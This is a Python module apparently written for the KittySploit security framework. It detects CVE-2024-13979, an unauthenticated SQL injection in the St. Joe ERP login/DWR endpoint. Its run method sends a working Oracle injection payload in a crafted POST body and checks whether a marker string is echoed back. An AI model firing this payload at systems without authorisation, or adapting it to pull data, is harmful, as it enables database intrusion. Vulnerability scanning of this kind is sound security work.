#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A SQL injection vulnerability exists in the St."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'St. Joe ERP system - SQL Injection Detection',
        'description': 'A SQL injection vulnerability exists in the St. Joe ERP system ("圣乔ERP系统") that allows unauthenticated remote attackers to execute arbitrary SQL commands via crafted HTTP POST requests to the login endpoint. The application fails to properly sanitize user-supplied input before incorporating it into SQL queries, enabling direct manipulation of the backend database.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'erp', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/adysec/POC/blob/main/wpoc/%E5%9C%A3%E4%B9%94ERP/%E5%9C%A3%E4%B9%94ERP%E7%B3%BB%E7%BB%9FSingleRowQueryConvertor%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md',
            'https://www.vulncheck.com/advisories/st-joes-erp-system-sqli',
        ],
        'cve': 'CVE-2024-13979',
    }

    def run(self):
        path = '/erp/dwr/call/plaincall/SingleRowQueryConvertor.queryForString.dwr'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/plain'}, data='callCount=1\npage=/erp/dwr/test/SingleRowQueryConvertor\nhttpSessionId=\nscriptSessionId=D528B0534A8BE018344AB2D54E02931D86\nc0-scriptName=SingleRowQueryConvertor\nc0-methodName=queryForString\nc0-id=0\nc0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(67)||CHR(86)||CHR(69)||CHR(45)||CHR(50)||CHR(48)||CHR(50)||CHR(52)||CHR(45)||CHR(49)||CHR(51)||CHR(57)||CHR(55)||CHR(57)||CHR(62))) FROM DUAL)\nc0-param1=Array:[]\nbatchId=0\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('CVE-2024-13979',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='St. Joe ERP system - SQL Injection detected', path=path)
            return True
        return False

